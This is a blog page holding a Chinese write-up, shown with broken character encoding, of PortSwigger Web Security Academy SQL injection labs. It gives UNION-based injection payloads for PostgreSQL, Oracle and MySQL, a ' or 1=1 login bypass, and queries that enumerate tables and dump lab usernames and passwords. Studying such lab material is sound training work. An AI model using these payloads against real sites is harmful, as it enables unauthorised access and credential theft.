<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>PortSwiggeræ‰“é¶éšè®° | Vincent</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="è¿™ç¯‡æ–‡ç« æ¥æ‰“burpå®˜æ–¹æä¾›çš„portswiggerçš„éƒ¨åˆ†é¶åœº">
<meta property="og:type" content="article">
<meta property="og:title" content="PortSwiggeræ‰“é¶éšè®°">
<meta property="og:url" content="http://handsome-vincent.space/2023/07/11/PortSwigger%E6%89%93%E9%9D%B6%E9%9A%8F%E8%AE%B0/index.html">
<meta property="og:site_name" content="Vincent">
<meta property="og:description" content="è¿™ç¯‡æ–‡ç« æ¥æ‰“burpå®˜æ–¹æä¾›çš„portswiggerçš„éƒ¨åˆ†é¶åœº">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://handsome-vincent.space/pic%5CPortSwigger%E6%89%93%E9%9D%B6%E9%9A%8F%E8%AE%B0/1.png">
<meta property="og:image" content="http://handsome-vincent.space/pic%5CPortSwigger%E6%89%93%E9%9D%B6%E9%9A%8F%E8%AE%B0/2.png">
<meta property="article:published_time" content="2023-07-11T04:58:22.000Z">
<meta property="article:modified_time" content="2023-09-29T14:39:25.994Z">
<meta property="article:author" content="Vincent">
<meta property="article:tag" content="sql">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://handsome-vincent.space/pic%5CPortSwigger%E6%89%93%E9%9D%B6%E9%9A%8F%E8%AE%B0/1.png">
  
    <link rel="alternative" href="/atom.xml" title="Vincent" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/favicon.ico">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  
<meta name="generator" content="Hexo 6.3.0"></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
				<img lazy-src="/img/logo.jpg" class="js-avatar">
			
		</a>

		<hgroup>
			<h1 class="header-author"><a href="/">Vincent</a></h1>
		</hgroup>

		
			<p class="header-subtitle"></p>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">Home</a></li>
				        
							<li><a href="/archives">Archives</a></li>
				        
						</ul>
					</nav>
					<nav class="half-header-menu">
						<a class="hide">Home</a>
						<a>Tags</a>
						<a>Links</a>
						<a>About</a>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
						<!-- music -->
						
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						<a href="/tags/file-inclusion/" style="font-size: 13.33px;">file_inclusion</a> <a href="/tags/file-upload/" style="font-size: 15px;">file_upload</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/python/" style="font-size: 18.33px;">python</a> <a href="/tags/sql/" style="font-size: 20px;">sql</a> <a href="/tags/vuln/" style="font-size: 11.67px;">vuln</a> <a href="/tags/xss/" style="font-size: 16.67px;">xss</a> <a href="/tags/xxe/" style="font-size: 10px;">xxe</a>
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
			        
			        </div>
				</section>
				

				
				
				<section class="switch-part switch-part4">
				
					<div id="js-aboutme">ä¸ä¸æ— è°“äººäº‰æ°”</div>
				</section>
				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="/img/logo.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">Home</a></li>
		        
					<li><a href="/archives">Archives</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap"><article id="post-PortSwiggeræ‰“é¶éšè®°" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2023/07/11/PortSwigger%E6%89%93%E9%9D%B6%E9%9A%8F%E8%AE%B0/" class="article-date">
  	<time datetime="2023-07-11T04:58:22.000Z" itemprop="datePublished">2023-07-11</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      PortSwiggeræ‰“é¶éšè®°
      
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql/" rel="tag">sql</a></li></ul>
	</div>

        
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/Web/">Web</a>
	</div>


        
        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>è¿™ç¯‡æ–‡ç« æ¥æ‰“burpå®˜æ–¹æä¾›çš„portswiggerçš„éƒ¨åˆ†é¶åœº</p>
<span id="more"></span>

<h1 id="postgresqlæ³¨å…¥"><a href="#postgresqlæ³¨å…¥" class="headerlink" title="postgresqlæ³¨å…¥"></a>postgresqlæ³¨å…¥</h1><p>ç‚¹è¿›å»æ˜¯å•†å“è®¢è´­ç•Œé¢ï¼Œéšä¾¿ç‚¹è¿›å»ä¸€ä¸ªï¼ŒæŸ¥çœ‹urlï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">https://0acd0080047e94b286d27aae00ca001f.web-security-academy.net/product?productId=7<br></code></pre></td></tr></table></figure>

<p>æ³¨å…¥ä¸å°±æ¥äº†å—ï¼Ÿä½†æ˜¯è¿™é‡Œåˆé‡åˆ°äº†ä¸€ä¸ªé—®é¢˜â€”-&gt;åˆ¤æ–­ä¸å‡ºé—­åˆï¼Ÿ</p>
<p>å•å¼•å·åŒå¼•å· and 1&#x3D;1 and 1&#x3D;2 éƒ½æ˜¯ä¸€ä¸ªæŠ¥é”™é¡µé¢ï¼š<code>&quot;Invalid product ID&quot;</code></p>
<p>éš¾é“æ³¨å…¥çš„ç‚¹ä¸æ˜¯åœ¨è¿™é‡Œï¼Ÿå›åˆ°ä¸»ç•Œé¢å†è¯•è¯•çœ‹ï¼Œå‘ç°è¿˜æœ‰ä¸€ä¸ªcategoryçš„å‚æ•°ä¼ é€’çš„ç‚¹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">https://0acd0080047e94b286d27aae00ca001f.web-security-academy.net/filter?category=Accessories<br></code></pre></td></tr></table></figure>

<p>å°è¯•æ³¨å…¥ï¼Œï¼Œï¼ŒæˆåŠŸæµ‹è¯•å‡ºæ³¨å…¥ç‚¹ï¼</p>
<ol>
<li><p>é—­åˆ å•å¼•å·</p>
</li>
<li><p>å­—æ®µæ•°ï¼š8</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?category=Accessories&#x27; order by 8--+<br></code></pre></td></tr></table></figure>
</li>
<li><p>å°è¯•è”åˆæŸ¥è¯¢è·å–å›æ˜¾ç‚¹ï¼Œï¼Œå¤±è´¥ï¼Œå°è¯•æŠ¥é”™æ³¨å…¥ï¼Œï¼Œè¿˜æ˜¯å¤±è´¥ï¼Œï¼Œå°è¯•å¸ƒå°”ç›²æ³¨</p>
<p>è¿™ä¸ªå€’æ˜¯æˆåŠŸäº†ï¼Œæœ‰ä¸åŒçš„é¡µé¢</p>
<p>ä½†æ˜¯å¸ƒå°”ç›²æ³¨è¿‡äºéº»çƒ¦ï¼Œè¿™é‡Œä¸è®°å½•äº†ï¼Œè¿™é‡Œå°è¯•æ–°çš„æ³¨å…¥æ–¹æ³•ï¼šsqlmapä¸‡èƒ½æ³¨å…¥ğŸ˜</p>
<p><img src="/./pic%5CPortSwigger%E6%89%93%E9%9D%B6%E9%9A%8F%E8%AE%B0/1.png"></p>
</li>
</ol>
<p>åŸæ¥æ˜¯postgresqlæ•°æ®åº“ç±»å‹ï¼Œæš‚æ—¶é€€ä¸‹sqlmapï¼Œçœ‹ç€ä¸Šæ¬¡æ¢³ç†çš„æ–‡ç« å®æ“ä¸€ä¸‹å§</p>
<p>æ³¨å‡ºå›æ˜¾ç‚¹:</p>
<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs postgresql">?category=Accessories<span class="hljs-string">&#x27; union all select null,null,null,null,null,null,null,null--+</span><br></code></pre></td></tr></table></figure>

<p>ç„¶ååˆ¤æ–­æ¯ä¸€ä½çš„æ•°æ®ç±»å‹ï¼Œä¸€ä½ä¸€ä½çš„æ›¿æ¢ï¼š</p>
<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs postgresql">?category=Accessories<span class="hljs-string">&#x27; union all select null,&#x27;</span>null1<span class="hljs-string">&#x27;,&#x27;</span>null2<span class="hljs-string">&#x27;,null,null,&#x27;</span>null3<span class="hljs-string">&#x27;,null,&#x27;</span>null4<span class="hljs-string">&#x27;--+</span><br></code></pre></td></tr></table></figure>

<p>â€‹	ç•Œé¢çš„å›æ˜¾ç‚¹æ˜¯null2ï¼Œç„¶åæˆ‘ä»¬è·å–æ•°æ®åº“ï¼š</p>
<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs postgresql">?category=Accessories<span class="hljs-string">&#x27; union all select null,&#x27;</span>null1<span class="hljs-string">&#x27;,current_database(),null,null,&#x27;</span>null3<span class="hljs-string">&#x27;,null,&#x27;</span>null4<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure>

<p>å¾—åˆ°å½“å‰æ•°æ®åº“åæ˜¯<code>academy_labs</code></p>
<p>ç„¶åæŸ¥è¡¨åï¼š</p>
<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs postgresql">?category=Accessories<span class="hljs-string">&#x27; union all select null,&#x27;</span>null1<span class="hljs-string">&#x27;,tablename,null,null,&#x27;</span>null3<span class="hljs-string">&#x27;,null,&#x27;</span>null4<span class="hljs-string">&#x27; from pg_tables where schemaname=&#x27;</span><span class="hljs-built_in">public</span><span class="hljs-string">&#x27;--+</span><br></code></pre></td></tr></table></figure>

<p>å¾—åˆ°å½“å‰è¡¨åæ˜¯<code>products</code>ï¼Œç„¶åè·å–åˆ—åï¼š</p>
<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs postgresql">?category=Accessories<span class="hljs-string">&#x27; union all select null,&#x27;</span>null1<span class="hljs-string">&#x27;,column_name,null,null,&#x27;</span>null3<span class="hljs-string">&#x27;,null,&#x27;</span>null4<span class="hljs-string">&#x27; from information_schema.columns where table_schema=&#x27;</span><span class="hljs-built_in">public</span><span class="hljs-string">&#x27; and table_name=&#x27;</span>products<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure>

<p>è·å–å‡ºäº†åˆ—åï¼š</p>
<p><code>id category name rating price image released description</code></p>
<p>ç„¶ådumpå…¨éƒ¨å†…å®¹ï¼š</p>
<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs postgresql">?category=Accessories<span class="hljs-string">&#x27; union all select null,&#x27;</span>null1<span class="hljs-string">&#x27;,price||&#x27;</span>::<span class="hljs-string">&#x27;||name,null,null,&#x27;</span>null3<span class="hljs-string">&#x27;,null,&#x27;</span>null4<span class="hljs-string">&#x27; from public.products--+</span><br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œå°±åªæŒ‘é€‰ä¸¤åˆ—çš„å†…å®¹å§ï¼ŒæˆåŠŸdumpå…¨éƒ¨ï¼š</p>
<p><img src="/./pic%5CPortSwigger%E6%89%93%E9%9D%B6%E9%9A%8F%E8%AE%B0/2.png"></p>
<p>æˆåŠŸï¼å®Œç¾</p>
<p>è¿™ä¸€æ¬¡çš„ä¸»è¦å…³é”®ç‚¹æ˜¯å¯¹äºæ•°æ®åº“ç±»å‹çš„åˆ¤æ–­ï¼Œéœ€è¦å€ŸåŠ©sqlmapæ¥åˆ¤æ–­æ•°æ®åº“ç±»å‹ä»¥è¿›è¡Œæ³¨å…¥è¯­å¥çš„é€‰æ‹©</p>
<h1 id="ç™»å½•æ¡†sqlæ³¨å…¥ç»•è¿‡"><a href="#ç™»å½•æ¡†sqlæ³¨å…¥ç»•è¿‡" class="headerlink" title="ç™»å½•æ¡†sqlæ³¨å…¥ç»•è¿‡"></a>ç™»å½•æ¡†sqlæ³¨å…¥ç»•è¿‡</h1><p>ç›¸æ¯”å‰é¢ä¸€å…³ï¼Œè¿™ä¸€å…³ä¼¼ä¹æ²¡æœ‰äº†categoryçš„è¿™ä¸ªé€‰é¡¹ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬éœ€è¦ä»å…¶ä»–åœ°æ–¹æ‰¾æ³¨å…¥ç‚¹</p>
<p>è´­ç‰©å•†å“çš„idåº”è¯¥æ˜¯æ³¨å…¥ä¸äº†ï¼Œçœ‹è¿™ä¸ªé¶åœºçš„æ ‡é¢˜ï¼Œåº”è¯¥æ˜¯ç™»å½•æ¡†ä¸‹çš„postæ³¨å…¥ï¼Œæˆ‘ä»¬çœ‹åˆ°æœ‰ä¸€ä¸ªMyAccounté€‰é¡¹ï¼Œçœ‹æ¥å°±æ˜¯è¿™ä¸ªäº†</p>
<p>æ„é€ ä¸‡èƒ½å¯†ç ï¼š<code>admin&#39; or 1=1 --+</code></p>
<p>å‘ç°æç¤ºç”¨æˆ·ååæœ‰é—®é¢˜ï¼Œåæ¥åˆçœ‹äº†å¥½ä¹…ä¹Ÿä¸çŸ¥é“é—®é¢˜åœ¨å“ªé‡Œã€‚ã€‚å°±ç®—æ˜¯postgresqlæ•°æ®åº“ä¹Ÿä¸åº”è¯¥å‡ºç°é—®é¢˜</p>
<p>çœ‹äº†ä»¥ä¸‹å®˜æ–¹ç»™å‡ºçš„solutionï¼ŒåŸæ¥è¿™é‡Œçš„ç”¨æˆ·åæ˜¯administratorï¼</p>
<p>å› æ­¤æˆ‘ä»¬çš„ä¸‡èƒ½å¯†ç åº”è¯¥æ˜¯<code>administratror&#39; or 1=1--</code></p>
<p>è¿™é‡ŒåˆæŠ±ç€å°è¯•çš„å¿ƒç†æƒ³è¯•è¯•çœ‹<code>&#39; or 1=1--+</code>è¿™ä¸ªä¸‡èƒ½å¯†ç å¯ä¸å¯ä»¥ç”¨ï¼Œç»“æœå‘ç°æ˜¯å¯ä»¥çš„ï¼</p>
<h1 id="orancleæ³¨å…¥"><a href="#orancleæ³¨å…¥" class="headerlink" title="orancleæ³¨å…¥"></a>orancleæ³¨å…¥</h1><p>è¿™ä¸€å…³æç¤ºæ˜¯orancleæ•°æ®åº“äº†</p>
<ol>
<li><p>åˆ¤æ–­é—­åˆâ€”&gt;å•å¼•å·ï¼Œå’ŒMySQLä¸€æ ·</p>
</li>
<li><p>åˆ¤æ–­å­—å­—æ®µæ•°â€”&gt;2ï¼Œå’ŒMySQLä¸€æ ·</p>
</li>
<li><p>æ³¨å‡ºå›æ˜¾ç‚¹</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?category<span class="hljs-operator">=</span>Pets<span class="hljs-string">&#x27; union all select &#x27;</span>null1<span class="hljs-string">&#x27;,&#x27;</span>null2<span class="hljs-string">&#x27; from dual--+</span><br></code></pre></td></tr></table></figure>

<p>ä¸¤ä¸ªéƒ½æ˜¯å­—ç¬¦ç±»å‹çš„å¹¶ä¸”éƒ½æœ‰å›æ˜¾</p>
</li>
<li><p>è·å–ç”¨æˆ·å</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?category<span class="hljs-operator">=</span>Gifts<span class="hljs-string">&#x27; union all select user,&#x27;</span>null114514<span class="hljs-string">&#x27; from dual--+</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>é€šè¿‡ç”¨æˆ·åè·å–å…¨éƒ¨è¡¨åï¼Œè¿™ä¸ªæ˜¯æœ€é«˜æ•ˆçš„</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?category<span class="hljs-operator">=</span><span class="hljs-operator">-</span>Gifts<span class="hljs-string">&#x27; union select (select LISTAGG(table_name,&#x27;</span>,<span class="hljs-string">&#x27;)within group(order by owner)name from all_tables where owner=&#x27;</span>PETER<span class="hljs-string">&#x27;),&#x27;</span>null114514<span class="hljs-string">&#x27; from dual --</span><br></code></pre></td></tr></table></figure>

<p>æ³•äºŒ</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?category<span class="hljs-operator">=</span><span class="hljs-operator">-</span>Gifts<span class="hljs-string">&#x27; union select table_name,&#x27;</span>null114514<span class="hljs-string">&#x27; from user_tables where rownum=1 --</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>è·å–è¡¨ä¸­çš„åˆ—å</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?category<span class="hljs-operator">=</span><span class="hljs-operator">-</span>Gifts<span class="hljs-string">&#x27; union select (column_name),&#x27;</span>null114514<span class="hljs-string">&#x27; from user_tab_columns where rownum=1 and table_name =&#x27;</span>PRODUCTS<span class="hljs-string">&#x27; --</span><br></code></pre></td></tr></table></figure>

<p>ç„¶åç”¨è·å–åˆ°çš„åˆ—åä¸€æ­¥ä¸€æ­¥å¾€ä¸‹æ¨</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?category<span class="hljs-operator">=</span><span class="hljs-operator">-</span>Gifts<span class="hljs-string">&#x27; union select (column_name),&#x27;</span>null114514<span class="hljs-string">&#x27; from user_tab_columns where rownum=1 and table_name =&#x27;</span>PRODUCTS<span class="hljs-string">&#x27; and column_name&lt;&gt;&#x27;</span>ID<span class="hljs-string">&#x27;--</span><br></code></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?category<span class="hljs-operator">=</span><span class="hljs-operator">-</span>Gifts<span class="hljs-string">&#x27; union select (column_name),&#x27;</span>null114514<span class="hljs-string">&#x27; from user_tab_columns where rownum=1 and table_name =&#x27;</span>PRODUCTS<span class="hljs-string">&#x27; and column_name&lt;&gt;&#x27;</span>ID<span class="hljs-string">&#x27; and column_name&lt;&gt;&#x27;</span>CATEGORY<span class="hljs-string">&#x27; and column_name&lt;&gt;&#x27;</span>NAME<span class="hljs-string">&#x27; and column_name&lt;&gt;&#x27;</span>RATING<span class="hljs-string">&#x27; and column_name&lt;&gt;&#x27;</span>PRICE<span class="hljs-string">&#x27; and column_name&lt;&gt;&#x27;</span>IMAGE<span class="hljs-string">&#x27; and column_name&lt;&gt;&#x27;</span>RELEASED<span class="hljs-string">&#x27; and column_name&lt;&gt;&#x27;</span>DESCRIPTION<span class="hljs-string">&#x27;--</span><br></code></pre></td></tr></table></figure>

<p>åˆ°è¿™ä¸€æ­¥æ²¡æœ‰æ›´å¤šçš„å›æ˜¾äº†å°±æ˜¯æ²¡æœ‰æ›´å¤šçš„åˆ—åäº†</p>
</li>
<li><p>dumpå…¨éƒ¨å†…å®¹</p>
<p>postgresqlæ²¡æœ‰MySQLé‚£æ ·æ–¹ä¾¿çš„group_concat()å‡½æ•°ï¼Œåªèƒ½ä¸€æ­¥ä¸€æ­¥çš„è‡ªå·±æ‰‹åŠ¨æ¨</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?category<span class="hljs-operator">=</span><span class="hljs-operator">-</span>Gifts<span class="hljs-string">&#x27; union select DESCRIPTION,&#x27;</span>null114514<span class="hljs-string">&#x27; from PRODUCTS --</span><br></code></pre></td></tr></table></figure></li>
</ol>
<hr>
<p>è‡³æ­¤ï¼Œè¿™ä¸ªé¶åœºå®Œç¾ç»“æŸï¼</p>
<h1 id="mysqlæ³¨å…¥"><a href="#mysqlæ³¨å…¥" class="headerlink" title="mysqlæ³¨å…¥"></a>mysqlæ³¨å…¥</h1><p>MySQLæ•°æ®åº“æ˜¯å§ï¼Œï¼Œï¼Œäº”åˆ†é’Ÿæ‹¿ä¸‹ï¼</p>
<ol>
<li><p>åˆ¤æ–­é—­åˆ å•å¼•å·</p>
</li>
<li><p>åˆ¤æ–­å­—æ®µæ•° 2</p>
</li>
<li><p>æ³¨å‡ºå›æ˜¾ç‚¹ 1 2éƒ½æ˜¯å›æ˜¾ç‚¹</p>
</li>
<li><p>è·å–æ•°æ®åº“å†…è¡¨å <code>products</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?category=--Pets&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--+<br></code></pre></td></tr></table></figure>
</li>
<li><p>è·å–è¡¨åå†…åˆ—å <code>category,description,id,image,name,price,rating,released</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?category=--Pets&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;products&#x27;--+<br></code></pre></td></tr></table></figure>
</li>
<li><p>è·å–å…¨éƒ¨æ•°æ®</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?category=--Pets&#x27; union select 1,group_concat(category,description,id,image,name,price,rating,released) from products--+<br></code></pre></td></tr></table></figure></li>
</ol>
<hr>
<p>åˆ°è¿™ä¸€æ­¥ï¼Œå·²ç»ç»“æŸäº†ï¼Œæ€»å…±è€—æ—¶5åˆ†é’Ÿï¼Œä½†æ˜¯å‡ºæ¥ä»¥åçœ‹é¶åœºä¾æ—§æ˜¾ç¤ºæ²¡æœ‰é€šå…³ï¼Ÿ</p>
<p>å›é¶åœºåˆçœ‹äº†çœ‹ï¼Œå‘ç°é¡¶éƒ¨æœ‰ä¸€ä¸ªæç¤ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Make the database retrieve the string: &#x27;8.0.33-0ubuntu0.20.04.2&#x27;<br></code></pre></td></tr></table></figure>

<p>é‚£å°±æ˜¯æŠŠpayloadæ¢æˆè¿™æ ·ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?category=-Pets&#x27; union select 1,&#x27;8.0.33-0ubuntu0.20.04.2&#x27;--+<br></code></pre></td></tr></table></figure>

<h1 id="postgresqlæ³¨å…¥2"><a href="#postgresqlæ³¨å…¥2" class="headerlink" title="postgresqlæ³¨å…¥2"></a>postgresqlæ³¨å…¥2</h1><p>è¿™ä¸€å…³æ–°å‡ºç°äº†ä¸€ä¸ªç™»å½•æ¡†ï¼Œçœ‹æ¥è¿™ä¸€å…³æ˜¯éœ€è¦bypass login</p>
<p>è¿™ä¸€å…³çš„é¢˜ç›®æè¿°å‘Šè¯‰æˆ‘ä»¬åº”è¯¥å…ˆè·å–åˆ°æ•°æ®åº“ä¸­çš„è¡¨ä¸­å†…å®¹ï¼Œç„¶åå°±å¯ä»¥ä½¿ç”¨æ•°æ®åº“ä¸­çš„è¡¨çš„å†…å®¹æˆåŠŸç™»å½•ï¼Œå› æ­¤æˆ‘ä»¬å…ˆä½¿ç”¨ç¬¬ä¸€å…³çš„æ³¨å…¥æ–¹å¼é‡æ–°æ³¨å…¥ä¸€é</p>
<p>æ­¥éª¤å°±çœç•¥äº†ï¼Œæ€»ä¹‹ï¼Œæœ€åçš„ä¸€æ­¥çš„payloadæ˜¯ï¼š</p>
<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs postgresql">?category=-Gifts<span class="hljs-string">&#x27; union select username_ucniul,password_yzwmyg from users_ckreei --+</span><br></code></pre></td></tr></table></figure>

<p>å¾—åˆ°çš„æ•°æ®å°±åŒ…å«äº†æˆ‘ä»¬éœ€è¦çš„ç”¨æˆ·å’Œå¯†ç ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">administrator<br>	dl98o3trorz7cskbaguh<br>carlos<br>	qc4qisc9ndlsyjjs60nq<br>wiener<br>	34gdu60zq3tp7stmej8n<br></code></pre></td></tr></table></figure>

<p>æœ€ç»ˆï¼ŒæˆåŠŸç™»å½•ï¼</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle">https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle</a></p>
<p>ï¼ˆç»™è‡ªå·±ç•™ä¸ªå‚è€ƒèµ„æ–™ï¼‰</p>
</blockquote>
<h1 id="orancleæ³¨å…¥2"><a href="#orancleæ³¨å…¥2" class="headerlink" title="orancleæ³¨å…¥2"></a>orancleæ³¨å…¥2</h1><p>å’Œä¸Šé¢ä¸€å…³å·®ä¸å¤šï¼Œåªæ˜¯æ¢äº†ä¸€ä¸ªæ•°æ®åº“ç±»å‹</p>
<p>å‰é¢çš„æ­¥éª¤ç›´æ¥ç•¥ï¼Œæœ€åè·å–åˆ°çš„å†…å®¹ï¼š</p>
<p>ç”¨æˆ·åï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">administrator<br>	2<br>carlos<br>	2<br>wiener<br>	2<br></code></pre></td></tr></table></figure>

<p>å¯†ç ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">2g8dqtbv9r0cek01r42y<br>	2<br>2ohduxnb1fdr59afvpiq<br>	2<br>ojqq1ah94210ymhe83k2<br>	2<br></code></pre></td></tr></table></figure>

<p>æˆåŠŸç™»å½•äº†ï¼Œè¿™ä¸ªé¶åœºä¹Ÿæ˜¯å®Œç¾ç»“æŸäº†ï¼</p>
<h1 id="sqlè”åˆæ³¨å…¥"><a href="#sqlè”åˆæ³¨å…¥" class="headerlink" title="sqlè”åˆæ³¨å…¥"></a>sqlè”åˆæ³¨å…¥</h1><p>è¿™ä¸€å…³æ¯«æ— éš¾åº¦ï¼Œæˆ‘åœ¨æµ‹è¯•æ•°æ®åº“ç±»å‹çš„æ—¶å€™å°±ç›´æ¥é€šå…³äº†ï¼Œé€šå…³payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?category=-Pets&#x27; union all select null,null,null --+<br></code></pre></td></tr></table></figure>

<p>çŒœæµ‹æ˜¯postgresqlæ•°æ®åº“ç±»å‹</p>
<h1 id="sqlè”åˆæ³¨å…¥2"><a href="#sqlè”åˆæ³¨å…¥2" class="headerlink" title="sqlè”åˆæ³¨å…¥2"></a>sqlè”åˆæ³¨å…¥2</h1><p>è¿™ä¸€å¹²ä¹Ÿå’Œä¸Šé¢ä¸€å…³ä¸€æ ·ï¼Œåªæ˜¯éœ€è¦ä½ æ‰¾åˆ°å…¶ä¸­çš„å­—ç¬¦å‹å›æ˜¾ä½å¹¶è¾“å…¥æŒ‡å®šçš„å†…å®¹ï¼Œåªè¦æ•°æ®åº“æ¥å—åˆ°äº†è¿™ä¸ªæŒ‡å®šçš„å­—ç¬¦ï¼Œå°±é€šå…³äº†ï¼Œå…·ä½“çš„è¯•æ•°æ®ç±»å‹å¯ä»¥çœ‹ä¸Šé¢çš„postgresqlæ³¨å…¥</p>
<p>paylaodï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?category=Pets&#x27; union all select null,&#x27;MsJjXo&#x27;,null--+<br></code></pre></td></tr></table></figure>

